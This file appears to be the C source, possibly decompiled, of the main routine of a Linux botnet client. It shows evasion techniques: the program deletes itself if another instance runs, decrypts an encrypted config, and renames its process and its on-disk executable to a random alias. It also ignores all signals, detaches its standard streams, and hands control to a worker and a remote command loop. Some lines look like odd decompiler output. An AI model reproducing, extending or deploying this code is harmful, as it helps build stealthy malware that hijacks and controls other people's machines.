#define _GNU_SOURCE

#include "process.h"

#include <libgen.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

extern int instance_acquire(void);
extern int command_loop(char *program_arg);
extern int config_initialize(void);
extern int config_decrypt_entry(int index);
extern int config_encrypt_entry(int index);
extern void prng_seed(void);
extern uint32_t prng_next(void);
extern uint32_t resolver_select_dns_server(void);
extern uint32_t resolver_discover_local_address(void);

uint32_t g_dns_server_address;
uint32_t g_local_address;

static uint32_t g_main_status;

static void disguise_process_and_executable(int argc, char **argv,
                                            const StringList *aliases)
{
    if (aliases == NULL || aliases->count <= 0) {
        return;
    }

    memset(argv[0], 0, strlen(argv[0]) + strlen(argv[1]) + 1);

    uint32_t selected = prng_next() % (uint32_t)aliases->count;
    char *alias = aliases->items[selected];
    strcpy(argv[0], alias);
    (void)prctl(PR_SET_NAME, alias, 0, 0, 0);

    if (alias == NULL) {
        return;
    }

    char executable[0x1000] = {0};
    char directory[0x1000] = {0};
    char renamed[0x1000] = {0};

    ssize_t length = readlink("/proc/self/exe", executable,
                              sizeof(executable) - 1);
    if (length <= 0) {
        return;
    }

    executable[length] = '\0';
    strncpy(directory, executable, sizeof(directory));
    strcpy(renamed, dirname(directory));

    memcpy(renamed + strlen(renamed), "/", (size_t)argc);
    strcat(renamed, alias);
    (void)rename(executable, renamed);
}

int main(int argc, char **argv)
{
    if (argc != 2 || argv[1] == NULL) {
        return 1;
    }

    if (instance_acquire() == 0) {
        (void)unlink(argv[0]);
        return 1;
    }

    if (argv[1] == NULL) {
        (void)write(STDOUT_FILENO, "t.me/disconnect\n", 0x10);
    }

    (void)write(STDOUT_FILENO, ".data\n", 7);

    char *program_arg = string_duplicate(argv[1]);
    config_initialize();
    prng_seed();

    (void)config_decrypt_entry(argc);
    StringList *aliases = string_split(g_config[2].data, ":");
    disguise_process_and_executable(argc, argv, aliases);

    (void)config_encrypt_entry(2);
    (void)chdir("/");

    for (int signal_number = 1; signal_number != 0x41; ++signal_number) {
        (void)signal(signal_number, SIG_IGN);
    }

    (void)close(STDIN_FILENO);
    (void)close(STDOUT_FILENO);
    (void)close(STDERR_FILENO);

    (void)process_launch_worker();

    g_dns_server_address = resolver_select_dns_server();
    g_local_address = resolver_discover_local_address();
    g_main_status = 0;

    (void)command_loop(program_arg);
    return (int)g_main_status;
}
